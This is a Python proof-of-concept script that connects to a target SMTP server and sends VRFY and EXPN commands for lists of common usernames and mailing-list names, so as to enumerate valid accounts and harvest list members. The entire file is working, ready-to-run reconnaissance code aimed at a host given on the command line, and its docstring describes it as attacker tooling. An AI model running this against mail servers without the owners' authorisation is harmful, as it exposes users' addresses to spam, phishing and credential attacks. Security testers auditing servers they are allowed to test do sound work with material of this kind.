#!/usr/bin/env python3
"""
Proof-of-Concept: Address Verification via VRFY/EXPN Commands

This script demonstrates how an attacker can enumerate valid user accounts
and harvest mailing list members from an SMTP server that improperly supports
the VRFY and EXPN commands.

Vulnerability: RFC 5321 Section 7.3 & 3.5.1
Severity: High
Category: AuthBypass / Information Disclosure

Usage:
    python3 poc_address_verification_vrfy_expn.py <target_host> [target_port]

Example:
    python3 poc_address_verification_vrfy_expn.py smtp.target.com 25
"""

import sys
import socket
import ssl
import time

# Default SMTP port
DEFAULT_PORT = 25

# Timeout for socket operations
SOCKET_TIMEOUT = 10

# List of common usernames to test for enumeration
TEST_USERNAMES = [
    "admin",
    "root",
    "postmaster",
    "info",
    "support",
    "user1",
    "jdoe"
]

# List of common mailing list names to test for expansion
TEST_MAILING_LISTS = [
    "staff",
    "announce",
    "users",
    "dev-team",
    "all-employees"
]

def send_command(sock, command):
    """
    Sends a command to the SMTP server and returns the response.
    Handles multiline responses by reading until the last line doesn't end with '-'.
    """
    sock.sendall((command + "\r\n").encode())
    response_lines = []
    
    while True:
        line = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        if not line:
            break
        response_lines.append(line)
        # SMTP multiline responses end with a line that does not have a hyphen as the 4th character
        if len(line) >= 4 and line[3] != '-':
            break
            
    return "\n".join(response_lines)

def check_vrfy(sock, username, domain):
    """
    Attempts to verify a user using the VRFY command.
    Returns True if the user exists (250 response), False otherwise.
    """
    # VRFY can take a username or an email address
    command = f"VRFY {username}@{domain}"
    print(f"[*] Sending: {command}")
    response = send_command(sock, command)
    print(f"[+] Response: {response}")
    
    # Check for successful verification (250 code)
    if response.startswith("250"):
        print(f"[!] VULNERABLE: User '{username}@{domain}' exists!")
        return True
    elif response.startswith("252"):
        print(f"[i] Server returned 252: Verification not possible or disabled.")
        return False
    elif response.startswith("550") or response.startswith("553"):
        print(f"[-] User '{username}@{domain}' does not exist or is ambiguous.")
        return False
    else:
        print(f"[?] Unexpected response code: {response[:3]}")
        return False

def check_expn(sock, mailing_list):
    """
    Attempts to expand a mailing list using the EXPN command.
    Returns True if the list was expanded (250 response), False otherwise.
    """
    command = f"EXPN {mailing_list}"
    print(f"[*] Sending: {command}")
    response = send_command(sock, command)
    print(f"[+] Response: {response}")
    
    # Check for successful expansion (250 code)
    if response.startswith("250"):
        print(f"[!] VULNERABLE: Mailing list '{mailing_list}' expanded successfully!")
        print(f"[!] Members:\n{response}")
        return True
    elif response.startswith("252"):
        print(f"[i] Server returned 252: Expansion not possible or disabled.")
        return False
    elif response.startswith("550"):
        print(f"[-] Mailing list '{mailing_list}' does not exist or access denied.")
        return False
    else:
        print(f"[?] Unexpected response code: {response[:3]}")
        return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [target_port]")
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    
    print(f"[*] Target: {target_host}:{target_port}")
    print("[*] Starting SMTP connection...")
    
    try:
        # Create a socket and connect to the target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.connect((target_host, target_port))
        
        # Receive the initial banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        print(f"[+] Banner: {banner}")
        
        # Send EHLO to identify ourselves
        ehlo_response = send_command(sock, f"EHLO {socket.gethostname()}")
        print(f"[+] EHLO Response: {ehlo_response}")
        
        # Check if VRFY and EXPN are advertised in EHLO response
        if "VRFY" in ehlo_response:
            print("[!] Server advertises support for VRFY command.")
        else:
            print("[i] Server does not advertise VRFY, but we will test anyway.")
            
        if "EXPN" in ehlo_response:
            print("[!] Server advertises support for EXPN command.")
        else:
            print("[i] Server does not advertise EXPN, but we will test anyway.")
        
        print("\n[*] Testing VRFY command for user enumeration...")
        print("-" * 50)
        for username in TEST_USERNAMES:
            check_vrfy(sock, username, target_host)
            print()
            time.sleep(1)  # Be polite to the server
            
        print("\n[*] Testing EXPN command for mailing list harvesting...")
        print("-" * 50)
        for mailing_list in TEST_MAILING_LISTS:
            check_expn(sock, mailing_list)
            print()
            time.sleep(1)  # Be polite to the server
            
        # Send QUIT to close the connection gracefully
        quit_response = send_command(sock, "QUIT")
        print(f"[+] QUIT Response: {quit_response}")
        
    except socket.timeout:
        print("[!] Connection timed out.")
    except ConnectionRefusedError:
        print("[!] Connection refused. Is the SMTP service running?")
    except Exception as e:
        print(f"[!] An error occurred: {e}")
    finally:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    main()
